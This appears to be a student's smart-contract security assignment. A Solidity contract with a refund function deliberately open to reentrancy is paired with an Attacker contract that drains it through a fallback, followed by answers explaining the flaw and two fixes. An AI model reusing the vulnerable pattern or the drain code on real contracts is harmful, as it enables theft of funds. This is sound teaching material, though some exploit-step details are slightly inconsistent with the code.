/*
Nathan Ang
nathanan
KickBNB.sol
*/

pragma solidity ^0.8.0;

contract KickBNB {

  address payable public owner;
  uint public price;
  uint public numGuests;
  uint public numRegisteredGuests;
  mapping(address => bool) public registeredGuests;

  constructor(uint _price, uint _numGuests) {
    owner = payable(msg.sender);
    price = _price;
    numGuests = _numGuests;
    numRegisteredGuests = 0;
  }

  bool internal locked;

  function deposit() public payable {
    require(msg.value == price / numGuests);
    require(!registeredGuests[msg.sender]);
    registeredGuests[msg.sender] = true;
    numRegisteredGuests++;
  }

  function cancel() public {
    require(registeredGuests[msg.sender]);
    (msg.sender.call{value: price/numGuests}(""));
    registeredGuests[msg.sender] = false;
    numRegisteredGuests--;
  }

  function confirm() public {
    require(msg.sender == owner);
    require (numRegisteredGuests == numGuests);
    selfdestruct(payable(msg.sender));
  }
}

contract Attacker {

    address payable owner;
    KickBNB public kickBNB;
    uint public val;

    constructor(address _victim) payable {
        kickBNB = KickBNB(_victim);
        val = kickBNB.price() / kickBNB.numGuests();
        owner = payable(msg.sender);
    }

    function attack() public payable {
        require(msg.value >= val);
        kickBNB.deposit{value: val}();
        kickBNB.cancel();
    }
    
    /*
        Fallback function
    */
    fallback () external payable {
        if (address(kickBNB).balance >= 1 ether) {
          kickBNB.cancel();
        }
    }

    function sendFunds() public {
        owner.transfer(address(this).balance);
    }
}

/*
1. Explain the vulnerability.

A contract can have an anonymous function called a fallback function. 
This function does not take any arguments and in several cases, one of which is when
the contract recieves ether with no additional data. 
Thus, upon cancel in KickBNB, the call will trigger the fallback function in Attacker,
which was call cancel again, before it the address set to False in registeredGuests.

2. List the steps a malicious user could take to exploit the vulnerability.

    1. 
        Sender: 0x1...
        Contract: KickBNB
        Function: deploy
        Parameters: _price = 5000, _numGuests = 5
    2. 
        Sender: 0x2...
        Contract: Attacker
        Function: deploy
    3.
        Sender: 0x2...
        Contract: KickBNB
        Function: deposit
        Parameters: msg.value = 1000 wei
    4.
        Sender: 0x2...
        Contract: Attacker
        Function: Attack
        Parameters: address victim = <KickBNB Address>
    5. 
        Sender: 0x2...
        Contract: Attacker
        Function: sendFunds


3. Explain one specific change you would make in order to make the KickBNB
   contract resilient to this vulnerability.
    a. Which line(s) of code would you modify?
      Lines 34-35
    b. How would you modify them?
      Move them above the call to call() on line 34-35

      Specifically, it would be:
        registeredGuests[msg.sender] = false;
        numRegisteredGuests--;
        (msg.sender.call{value: price/numGuests}(""));

      Instead of:
        (msg.sender.call{value: price/numGuests}(""));
        registeredGuests[msg.sender] = false;
        numRegisteredGuests--;
        

    c. Why does this change make the contract resilient to the vulnerability?
      This makes it such that upon the fallback function of Attacker, if cancel() is called,
      the updates to registeredGuests will have been made correctly. More generally,
      the state changes are made before the call to call().
      This invalidates any re-entry calls to cancel() requesting a refund 
      as it will not pass the require(registeredGuests[msg.sender])

4. Explain a second separate specific changes you would make in order to make the
   KickBNB contract resilient to this vulnerability.
    a. Which line(s) of code would you modify?
        Line 32-35
    b. How would you modify them?
        I would implement a reentry guard using a mutex.
        
        Specifically, it would be:
        
            bool lock = false; 
            
            ... 
            
            function cancel() public {
                require(registeredGuests[msg.sender]);
                require(!lock);
                lock = true;
                (msg.sender.call{value: price/numGuests}(""));
                registeredGuests[msg.sender] = false;
                numRegisteredGuests--;
                lock = false;
              }
            
    c. Why does this change make the contract resilient to the vulnerability?
        This means that during any re-entry call, there is a new requirement for lock
        to be set to false. However, we set lock to true before the call to call() and 
        only release the lock by setting it to false after the call is complete.
        On the re-entry attempt, the lock will be set to true and it will fail.

*/
